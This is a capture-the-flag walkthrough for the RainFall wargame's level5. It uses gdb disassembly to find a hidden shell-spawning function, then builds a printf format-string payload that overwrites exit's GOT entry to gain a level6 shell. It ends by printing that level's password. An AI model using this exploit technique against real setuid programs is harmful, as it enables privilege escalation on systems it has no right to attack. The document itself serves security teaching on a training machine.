# level5

## Hint

When we log into the machine as `level5`, we notice a binary:

```shell-session
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
level5@RainFall:~$
```

We notice that the `guid` bit is set, so the executable gets the rights of its group owners granted when it is executed, and conveniently enough the group in question is our target for the current level.

That being said, it seems we need to look into the binary in order to try to understand what input it's awaiting.

## gdb

Let's look now at the binary.

```gdb
level5@RainFall:~$ gdb -q ./level5
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp
   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n>                        <-- Call to function `n`
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.
```

Let's look at `n`.

```gdb
gdb-peda$ disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>            <-- Call to fget into esp
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>           <-- Call to printf with esp as conv string (?)
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

So we don't see any `system()` call here. Maybe there is another function ?

```gdb
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o                                          <-- An other function ! `o`
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```

Yes ! There it is. `o` not referenced in the control flow.

Let's see what's `o` tells us.

```gdb
gdb-peda$ disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp
   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>           <-- Call to system() with string "/bin/sh" 
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump
```

Ok now we have our call to `system()`.

We know where we need to go next in order to exploit our way to a shell.

But how can we do it ? Well there is some other symbol available we have not yet underligned: the `exit` function.

## exit me more

```gdb
gdb-peda$ info function
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit                         <--- exit function
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
gdb-peda$ disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp
   0x080484c5 <+3>:	sub    esp,0x218
   0x080484cb <+9>:	mov    eax,ds:0x8049848
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:	lea    eax,[ebp-0x208]
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    eax,[ebp-0x208]
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>       <-- pointer to the address returned by the PLT
End of assembler dump.
gdb-peda$ disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838     <- Dereferenced pointer to exit function call address, returned by the GOT
   0x080483d6 <+6>:	push   0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
```

We know that, when calling a dynamically linked function, including everything from the libc, we use a system feature call PLT (procedure linkage table), this procedure allows for the resolution of addresses unknown at runtime, these addresses are stored in the GOT (Global Offset Table).

When execution sends a symbol to the PLT, the PLT asks the GOT for the actual address of that symbol (functions, etcetc...).

Therefor, the GOT returns a pointer to the proper address of that symbol. 

The only thing is that the value pointed to by that pointer, thanks to Format String Exploits, can be overwritten before the runtime evaluates that address, and will therefor resolve to an arbitrary (or not) function call.

What is left for us is to use a classic format string exploit to overwrite the address to call function `o()` that we know will run a new `shell`.

## Format Stringue Exploit

Same as before, we must first deduce the position of the arguments of printf, so we send it an easily readable string and look for the position of the segment "BBBB" which translates to  "42424242" and see it's in 4th position.

```shell-session
level5@RainFall:~$ (python -c 'print "BBBB" + "|-|%08x" * 20 ') | ./level5
BBBB|-|00000200|-|b7fd1ac0|-|b7ff37d0|-|42424242|-|257c2d7c|-|7c783830|-|30257c2d|-|2d7c7838|-|3830257c|-|7c2d7c78|-|78383025|-|257c2d7c|-|7c783830|-|30257c2d|-|2d7c7838|-|3830257c|-|7c2d7c78|-|78383025|-|257c2d7c|-|7c783830
```

Now we know that we can inject, usign `%n` like before, an arbitrary value to the argument in 4th position.

We also know that the pointer returned by the GOT is found at address `0x8049838`.
As shown by disassembling the `exit` symbol.

We must now determine what address we are aiming at, and therefor the value we are trying to inject, easily enough, it is the `o()` function address: `0x080484a4` which equals to 134513828.

With all that in mind, we can construct a string that not only uses `%n` as a means to inject an arbitrary value (134513828), but also the address we are trying to overwrite (the one pointed to by 0x8049838).

The last thing is that we must substract 4 bytes from the total amout of bytes to write to leave room for the Format String address and have the correct value sent by `%n`, as well as consider endianess when writing the address in the format string.

```shell-session
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%134513824c" + "%4$n"'; cat) | ./level5
[...Huge long string of bytes that prints for tens of seconds...]
_
whoami
level6
cat ~level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
